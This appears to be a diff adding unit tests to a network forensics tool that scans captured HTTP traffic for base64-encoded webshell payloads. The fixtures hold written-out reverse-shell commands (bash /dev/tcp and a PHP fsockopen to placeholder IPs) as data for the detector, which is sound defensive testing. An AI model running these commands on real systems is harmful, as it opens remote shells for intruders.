@@ -394,6 +394,70 @@ class TestForensics(unittest.TestCase):
         self.assertLess(len(md), 200000, "报告不应被噪声撑爆")
 
 
+class TestEncoded(unittest.TestCase):
+    """base64 载荷（蚁剑/冰蝎/哥斯拉）与口令字段误报。"""
+
+    def _pcap_with_post(self, name, body, uri=b"/upload/1.php"):
+        req = (b"POST " + uri + b" HTTP/1.1\r\nHost: t.local\r\n"
+               b"Content-Type: application/x-www-form-urlencoded\r\n"
+               b"Content-Length: %d\r\n\r\n" % len(body)) + body
+        return write_pcap(name, [(1.0, pkt("10.0.0.1", "10.0.0.2", 1, 80, 1, req)),
+                                 (1.1, pkt("10.0.0.2", "10.0.0.1", 80, 1, 1, resp(b"ok")))])
+
+    def test_reverse_shell_detected(self):
+        import base64 as b64
+        cmd = b'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'
+        body = b"pass=" + b64.b64encode(cmd)          # 纯 base64，不含 + 号
+        p = self._pcap_with_post("b64a.pcap", body)
+        recs, _ = conv(p)
+        found, scanned = P.scan_b64(recs)
+        self.assertEqual(len(found), 1, "应解出 1 条可疑载荷")
+        self.assertEqual(P.classify_b64(found[0]), "反弹/C2 指令")
+        self.assertIn(b"/dev/tcp/1.2.3.4/4444", found[0]["decoded"])
+        self.assertEqual(found[0]["param"], "pass")
+
+    def test_url_encoded_plus_preserved(self):
+        """base64 里的 + 常被 URL 编码成 %2B，解码不能截断。"""
+        import base64 as b64
+        base = b'php -r \'$s=fsockopen("5.6.7.8",8864);\';' + b"x" * 40
+        cmd = raw = None
+        for _ in range(500):                    # 找一个 base64 里确实含 + 的载荷
+            cand = os.urandom(4) + base
+            if b"+" in b64.b64encode(cand):
+                cmd, raw = cand, b64.b64encode(cand)
+                break
+        self.assertIsNotNone(cmd, "未构造出含 + 号的载荷，用例无效")
+        encoded = raw.replace(b"+", b"%2B").replace(b"=", b"%3D")
+        p = self._pcap_with_post("b64b.pcap", b"cmd=" + encoded)
+        found, _ = P.scan_b64(conv(p)[0])
+        self.assertTrue(found, "含 %2B 的载荷应能解出")
+        self.assertEqual(found[0]["decoded"], cmd)
+
+    def test_hash_like_strings_ignored(self):
+        p = self._pcap_with_post("b64c.pcap",
+                                 b"md5=f0d123bf4cccb5c9b8dbbcf532fd8cc0&name=hello")
+        found, scanned = P.scan_b64(conv(p)[0])
+        self.assertEqual(found, [], "哈希解出来是二进制，不应算命中")
+        self.assertGreaterEqual(scanned, 1)
+
+    def test_password_field_not_rce(self):
+        """password=whoami 属于爆破字典，不能算命令执行。"""
+        p = self._pcap_with_post("b64d.pcap",
+                                 b"user=admin&password=whoami&code=1",
+                                 uri=b"/admin/login.php?action=ck_login")
+        recs, _ = conv(p)
+        self.assertEqual(P.find_hits(recs)["命令执行特征"], [])
+
+    def test_cli_b64(self):
+        import base64 as b64
+        p = self._pcap_with_post("b64e.pcap", b"x=" + b64.b64encode(b"bash -i >& /dev/tcp/9.9.9.9/8080 0>&1"))
+        r = subprocess.run([sys.executable, TOOL, "b64", p, "--no-cache"], capture_output=True)
+        self.assertEqual(r.returncode, 0, r.stderr.decode("utf-8", "replace"))
+        out = r.stdout.decode("utf-8", "replace")
+        self.assertIn("反弹/C2 指令", out)
+        self.assertIn("9.9.9.9:8080", out)
+
+
 class TestCli(unittest.TestCase):
     def _run(self, *args):
         return subprocess.run([sys.executable, TOOL] + list(args), capture_output=True)
